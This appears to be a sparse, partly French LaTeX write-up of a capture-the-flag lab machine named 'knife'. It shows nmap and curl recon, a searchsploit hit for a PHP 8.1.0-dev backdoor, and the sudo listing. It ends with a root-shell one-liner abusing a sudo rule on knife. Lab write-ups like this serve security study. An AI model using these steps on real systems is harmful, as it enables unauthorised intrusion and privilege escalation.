\chapter{knife}
\begin{itemize}
    \item {\bf technics}: sudo gtofbins
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
PORTS=$(sudo nmap -p- -T4 --min-rate=1000 10.10.10.242 | grep '^[0-9]' |
    cut -d '/' -f 1 | tr '\n' ',' | sed s/',$'//)

sudo nmap -p${PORTS} -sV -sC -oX nmap.xml 10.10.10.242

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}



\subsubsection{http}

rien dans les fuff, vraiment rien a voir le seul truc c'est la stack techno
avec un php 8.1

\begin{verbatim}
$ curl -I http://10.10.10.242
HTTP/1.1 200 OK
Date: Thu, 27 Oct 2022 03:57:58 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8

\end{verbatim}

\begin{verbatim}
$ searchsploit php 8.1.0-dev

PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution | php/webapps/49933.py

\end{verbatim}

\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
$ ls -la /home/james
total 40
drwxr-xr-x 5 james james 4096 May 18  2021 .
drwxr-xr-x 3 root  root  4096 May  6  2021 ..
lrwxrwxrwx 1 james james    9 May 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Feb 25  2020 .bashrc
drwx------ 2 james james 4096 May  6  2021 .cache
drwxrwxr-x 3 james james 4096 May  6  2021 .local
-rw-r--r-- 1 james james  807 Feb 25  2020 .profile
-rw-rw-r-- 1 james james   66 May  7  2021 .selected_editor
drwx------ 2 james james 4096 May 18  2021 .ssh
-r-------- 1 james james   33 Oct 27 03:29 user.txt

$ ls /home/james/.ssh
id_rsa
id_rsa.pub

\end{verbatim}

\subsubsection{x}

\begin{verbatim}
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife


\end{verbatim}

\begin{verbatim}
$ sudo knife exec -E 'exec "/bin/sh"'

\end{verbatim}
\section{Theorie}


